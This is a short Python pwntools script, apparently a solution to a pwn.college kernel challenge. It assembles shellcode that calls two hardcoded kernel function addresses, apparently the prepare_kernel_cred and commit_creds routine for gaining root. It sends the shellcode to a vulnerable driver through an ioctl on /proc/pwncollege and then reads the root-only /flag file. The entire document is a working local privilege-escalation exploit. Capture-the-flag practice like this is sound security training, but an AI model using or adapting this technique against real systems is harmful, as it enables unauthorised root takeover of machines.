from pwn import *
import os
import fcntl

context.arch = "amd64"
byte_codes = asm('''
    mov rax, 0xffffffff81089660
    xor rdi, rdi
    call rax
    mov rdi, rax
    mov rax, 0xffffffff81089310
    call rax
    ret
''')

fd = os.open("/proc/pwncollege", 2)

old_termios = fcntl.ioctl(fd,1337 ,byte_codes)

os.close(fd)
fd1 = os.open("/flag", 0)
os.sendfile(1, fd1, 0, 0x40)